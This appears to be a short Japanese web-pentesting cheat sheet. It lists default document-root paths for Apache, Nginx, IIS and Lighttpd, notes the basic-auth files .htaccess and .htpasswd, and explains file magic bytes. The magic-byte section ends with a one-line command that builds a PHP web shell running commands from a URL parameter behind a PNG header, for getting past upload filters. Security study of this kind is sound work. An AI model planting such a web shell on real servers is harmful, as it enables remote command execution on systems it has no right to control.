# Document root
Web上に公開するディレクトリのルートを指す。
## Default document root
1. Apache
```
/var/www/html
/var/www
C:\Apache24\htdocs
C:\xampp\htdocs
```
2. Nginx
```
/var/www/html
/usr/share/nginx/html
C:\nginx\html
```
3. IIS
```
C:\inetpub\wwwroot
```
4. Lighttpd
```
/var/www/localhost/htdocs
/var/www
C:\LightTPD\htdocs
```
# basic authentication
basic認証。Webサイトの特定のページやファイルへのアクセスをIDとパスワードで制限する。
## 有効化
`/var/www/html/.htaccess`
## IDとパスワード設定
`/var/www/html/.htpasswd`
# Magic Byte
Webサーバーがファイル形式を判断する際に使用する先頭の数バイト列のこと。拡張子だけで偽装できないときに使用。
```bash
printf "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > shell.php.png # PNGファイル
echo 'FFD8FFDB' | xxd -r -p > shell.php.jpg # JPEGファイル
```
